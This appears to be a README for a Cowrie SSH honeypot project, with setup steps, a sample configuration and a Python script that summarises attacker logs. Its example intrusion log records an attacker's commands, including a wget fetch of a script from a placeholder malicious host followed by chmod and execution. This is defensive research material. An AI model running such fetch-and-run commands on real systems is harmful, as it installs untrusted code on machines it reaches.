# SSH Honeypot for Behavioral Analysis

This project implements a SSH honeypot using Cowrie to observe and analyze the behavior of attackers. A honeypot is a security mechanism designed to detect, deflect, or study unauthorized access attempts. By simulating a vulnerable SSH server, we can gather valuable insights into attack patterns, techniques, and attacker behavior.

## Overview

The SSH honeypot:
- Mimics a real SSH server to attract potential attackers
- Logs all interactions including commands executed by the attacker
- Safely captures malware samples that attackers may try to download
- Provides valuable data for security research and threat intelligence

## Features

- Complete logs of attacker sessions including commands executed
- Capture of authentication attempts (username/password combinations)
- Record of files downloaded by attackers
- Simulation of a realistic Linux environment
- Minimal risk to the host system

## Installation Guide

This guide provides step-by-step instructions to set up Cowrie SSH honeypot on Ubuntu/Debian-based systems.

### Prerequisites

- Ubuntu 20.04/22.04 LTS or Kali Linux
- Python 3.8 or higher
- Internet connection
- Basic knowledge of Linux command line

### Step 1: System Preparation

Update your system and install required dependencies:

```bash
sudo apt update
sudo apt upgrade -y
sudo apt install -y git python3-virtualenv libssl-dev libffi-dev build-essential libpython3-dev python3-minimal authbind virtualenv
```

### Step 2: Create a Dedicated User (Recommended for Security)

```bash
sudo adduser --disabled-password cowrie
sudo su - cowrie
```

### Step 3: Clone the Cowrie Repository

```bash
git clone https://github.com/cowrie/cowrie.git
cd cowrie
```

### Step 4: Set Up Virtual Environment

```bash
python3 -m virtualenv cowrie-env
source cowrie-env/bin/activate
pip install --upgrade pip
pip install --upgrade -r requirements.txt
```

### Step 5: Configure Cowrie

Copy the example configuration file:

```bash
cp etc/cowrie.cfg.dist etc/cowrie.cfg
```

Edit the configuration file:

```bash
nano etc/cowrie.cfg
```

### Step 6: Port Redirection

By default, Cowrie runs on port 2222. To capture real attack attempts, you'll need to redirect traffic from the standard SSH port (22) to Cowrie's port.

For iptables:

```bash
sudo iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2222
```

Alternatively, you can use authbind to allow Cowrie to bind to port 22 directly (requires modification in cowrie.cfg).

### Step 7: Start Cowrie

```bash
bin/cowrie start
```

### Step 8: Verify Cowrie is Running

```bash
bin/cowrie status
```

Check logs:

```bash
tail -f var/log/cowrie/cowrie.log
```

## Secure Configuration Example

Below is an example of a more secure configuration for your Cowrie honeypot. Edit your `etc/cowrie.cfg`:

```ini
[honeypot]
# Change the hostname to something believable
hostname = webserver01

# Change the SSH banner to mimic a specific SSH server version
ssh_version = SSH-2.0-OpenSSH_7.9p1 Ubuntu-10

# Customize the reported operating system
report_os = Ubuntu 20.04

# Set custom credentials that intruders might try
auth_class = cowrie.ssh.userauth.UsernamePasswordWithTokens

# Enable or disable specific features
auth_failure_delay = 3
interact_enabled = true
timezone = UTC+1

[ssh]
# You can enable/disable specific SSH functionality
# enabled = true
# versions = ssh-rsa,ssh-dss
sftp_enabled = true
forwarding = true

[telnet]
# We'll disable telnet for our honeypot
enabled = false

[output_jsonlog]
enabled = true
logfile = log/cowrie.json

[output_mysql]
enabled = false
# Configure if you want to use MySQL for logging
#host = localhost
#database = cowrie
#username = cowrie
#password = cowriepassword
#port = 3306
```

## Example of a Captured Intrusion Log

Below is an example of what a typical SSH intrusion attempt looks like in Cowrie's logs:

```json
{
    "eventid": "cowrie.session.connect", 
    "src_ip": "198.51.100.72", 
    "src_port": 49834, 
    "dst_ip": "203.0.113.45", 
    "dst_port": 2222, 
    "session": "6c46c404c20c", 
    "protocol": "ssh", 
    "timestamp": "2023-04-15T18:24:37.616108Z"
}
{
    "eventid": "cowrie.login.success", 
    "timestamp": "2023-04-15T18:24:42.491417Z", 
    "session": "6c46c404c20c", 
    "src_ip": "198.51.100.72", 
    "src_port": 49834, 
    "username": "admin", 
    "password": "admin123", 
    "protocol": "ssh"
}
{
    "eventid": "cowrie.command.input", 
    "timestamp": "2023-04-15T18:24:46.342330Z", 
    "session": "6c46c404c20c", 
    "input": "cat /proc/cpuinfo", 
    "src_ip": "198.51.100.72", 
    "src_port": 49834
}
{
    "eventid": "cowrie.command.input", 
    "timestamp": "2023-04-15T18:24:52.112928Z", 
    "session": "6c46c404c20c", 
    "input": "cd /tmp", 
    "src_ip": "198.51.100.72", 
    "src_port": 49834
}
{
    "eventid": "cowrie.command.input", 
    "timestamp": "2023-04-15T18:25:02.783321Z", 
    "session": "6c46c404c20c", 
    "input": "wget http://malicious-site.com/malware.sh", 
    "src_ip": "198.51.100.72", 
    "src_port": 49834
}
{
    "eventid": "cowrie.command.input", 
    "timestamp": "2023-04-15T18:25:12.221109Z", 
    "session": "6c46c404c20c", 
    "input": "chmod +x malware.sh", 
    "src_ip": "198.51.100.72", 
    "src_port": 49834
}
{
    "eventid": "cowrie.command.input", 
    "timestamp": "2023-04-15T18:25:15.547892Z", 
    "session": "6c46c404c20c", 
    "input": "./malware.sh", 
    "src_ip": "198.51.100.72", 
    "src_port": 49834
}
{
    "eventid": "cowrie.session.closed", 
    "timestamp": "2023-04-15T18:26:02.114271Z", 
    "session": "6c46c404c20c", 
    "duration": 84.49816656112671, 
    "src_ip": "198.51.100.72", 
    "src_port": 49834
}
```

## Log Analysis Script

Below is a Python script for basic analysis of Cowrie logs. Save it as `analyze_logs.py`:

```python
#!/usr/bin/env python3

import json
import argparse
import os
import re
import sys
from collections import Counter, defaultdict
from datetime import datetime

def parse_args():
    parser = argparse.ArgumentParser(description='Analyze Cowrie honeypot logs')
    parser.add_argument('-f', '--file', help='Log file to analyze', default='var/log/cowrie/cowrie.json')
    parser.add_argument('-o', '--output', help='Output file for the report', default='honeypot_report.txt')
    parser.add_argument('--ip-details', action='store_true', help='Show detailed per-IP statistics')
    return parser.parse_args()

def process_logs(logfile):
    if not os.path.exists(logfile):
        print(f"Error: Log file '{logfile}' not found.")
        sys.exit(1)
        
    stats = {
        'total_connections': 0,
        'unique_ips': set(),
        'login_attempts': 0,
        'successful_logins': 0,
        'commands': Counter(),
        'usernames': Counter(),
        'passwords': Counter(),
        'username_password_pairs': Counter(),
        'ip_activity': defaultdict(lambda: {
            'connections': 0,
            'successful_logins': 0,
            'commands': Counter(),
            'login_attempts': 0,
            'username_password_pairs': Counter(),
            'sessions': set()
        }),
        'downloaded_files': Counter(),
        'sessions': defaultdict(dict),
        'attacks_over_time': defaultdict(int),
    }
    
    with open(logfile, 'r') as f:
        for line in f:
            try:
                log_entry = json.loads(line)
                event_id = log_entry.get('eventid', '')
                timestamp = log_entry.get('timestamp', '')
                src_ip = log_entry.get('src_ip', 'unknown')
                session = log_entry.get('session', 'unknown')
                
                # Track session
                if session != 'unknown':
                    stats['sessions'][session]['ip'] = src_ip
                    
                # Track time
                if timestamp:
                    try:
                        dt = datetime.strptime(timestamp.split('.')[0], '%Y-%m-%dT%H:%M:%S')
                        date_key = dt.strftime('%Y-%m-%d')
                        hour_key = dt.strftime('%Y-%m-%d %H:00')
                        stats['attacks_over_time'][date_key] += 1
                    except Exception:
                        pass
                
                # Process by event type
                if event_id == 'cowrie.session.connect':
                    stats['total_connections'] += 1
                    stats['unique_ips'].add(src_ip)
                    stats['ip_activity'][src_ip]['connections'] += 1
                    stats['ip_activity'][src_ip]['sessions'].add(session)
                    
                elif event_id == 'cowrie.login.success':
                    username = log_entry.get('username', '')
                    password = log_entry.get('password', '')
                    stats['successful_logins'] += 1
                    stats['usernames'][username] += 1
                    stats['passwords'][password] += 1
                    stats['username_password_pairs'][(username, password)] += 1
                    stats['ip_activity'][src_ip]['successful_logins'] += 1
                    stats['ip_activity'][src_ip]['username_password_pairs'][(username, password)] += 1
                    
                elif event_id == 'cowrie.login.failed':
                    username = log_entry.get('username', '')
                    password = log_entry.get('password', '')
                    stats['login_attempts'] += 1
                    stats['usernames'][username] += 1
                    stats['passwords'][password] += 1
                    stats['ip_activity'][src_ip]['login_attempts'] += 1
                    
                elif event_id == 'cowrie.command.input':
                    command = log_entry.get('input', '').strip()
                    if command:
                        first_word = command.split()[0]
                        stats['commands'][first_word] += 1
                        stats['ip_activity'][src_ip]['commands'][first_word] += 1
                        
                elif event_id == 'cowrie.session.file_download':
                    url = log_entry.get('url', '')
                    if url:
                        stats['downloaded_files'][url] += 1
                        
            except json.JSONDecodeError:
                continue
                
    return stats

def generate_report(stats, output_file, show_ip_details=False):
    with open(output_file, 'w') as f:
        f.write("=== Cowrie Honeypot Analysis Report ===\n\n")
        
        f.write("== General Statistics ==\n")
        f.write(f"Total Connections: {stats['total_connections']}\n")
        f.write(f"Unique IPs: {len(stats['unique_ips'])}\n")
        f.write(f"Login Attempts: {stats['login_attempts']}\n")
        f.write(f"Successful Logins: {stats['successful_logins']}\n")
        f.write(f"Unique Sessions: {len(stats['sessions'])}\n\n")
        
        f.write("== Top 10 Commands ==\n")
        for cmd, count in stats['commands'].most_common(10):
            f.write(f"{cmd}: {count}\n")
        f.write("\n")
        
        f.write("== Top 10 Usernames ==\n")
        for username, count in stats['usernames'].most_common(10):
            f.write(f"{username}: {count}\n")
        f.write("\n")
        
        f.write("== Top 10 Passwords ==\n")
        for password, count in stats['passwords'].most_common(10):
            f.write(f"{password}: {count}\n")
        f.write("\n")
        
        f.write("== Top 10 Username/Password Combinations ==\n")
        for (username, password), count in stats['username_password_pairs'].most_common(10):
            f.write(f"{username}:{password} - {count}\n")
        f.write("\n")
        
        f.write("== Top 10 Downloaded Files/URLs ==\n")
        for url, count in stats['downloaded_files'].most_common(10):
            f.write(f"{url}: {count}\n")
        f.write("\n")
        
        f.write("== Attack Distribution by Date ==\n")
        for date, count in sorted(stats['attacks_over_time'].items()):
            f.write(f"{date}: {count}\n")
        f.write("\n")
        
        if show_ip_details:
            f.write("== Top 10 Attacking IPs ==\n")
            top_ips = sorted(stats['ip_activity'].items(), 
                            key=lambda x: x[1]['connections'], 
                            reverse=True)[:10]
            
            for ip, ip_stats in top_ips:
                f.write(f"\nIP: {ip}\n")
                f.write(f"  Total Connections: {ip_stats['connections']}\n")
                f.write(f"  Login Attempts: {ip_stats['login_attempts']}\n")
                f.write(f"  Successful Logins: {ip_stats['successful_logins']}\n")
                f.write(f"  Unique Sessions: {len(ip_stats['sessions'])}\n")
                
                f.write("  Top Commands:\n")
                for cmd, count in ip_stats['commands'].most_common(5):
                    f.write(f"    {cmd}: {count}\n")
                
                f.write("  Top Username/Password Combinations:\n")
                for (username, password), count in ip_stats['username_password_pairs'].most_common(5):
                    f.write(f"    {username}:{password} - {count}\n")
        
    print(f"Report generated: {output_file}")

def main():
    args = parse_args()
    stats = process_logs(args.file)
    generate_report(stats, args.output, args.ip_details)

if __name__ == '__main__':
    main()
```

## Usage

### Starting and Monitoring the Honeypot

1. Start the honeypot:
   ```bash
   cd ~/cowrie
   bin/cowrie start
   ```

2. Check the status:
   ```bash
   bin/cowrie status
   ```

3. View live logs:
   ```bash
   tail -f var/log/cowrie/cowrie.log
   ```

### Analyzing Logs

Run the analyzer script:

```bash
python3 analyze_logs.py -f var/log/cowrie/cowrie.json -o honeypot_report.txt --ip-details
```

## Security Considerations

- **Never run honeypots on production systems**
- Regularly check your honeypot logs for signs of escape attempts
- Keep the honeypot software updated to address any vulnerabilities
- Consider running the honeypot in a container or isolated VM for added security
- Monitor system resources to ensure the honeypot doesn't become a resource drain

## Legal Considerations

Before deploying a honeypot, consider the legal implications:

- Ensure you have proper authorization to run a honeypot on your network
- Check local laws regarding data collection and privacy
- Avoid using the honeypot for entrapment
- Consider adding a banner indicating system monitoring (though this may deter attackers)

## Contributing

Feel free to contribute to this project by submitting pull requests or opening issues for any bugs or feature requests.

## License

This project is licensed under the MIT License - see the LICENSE file for details.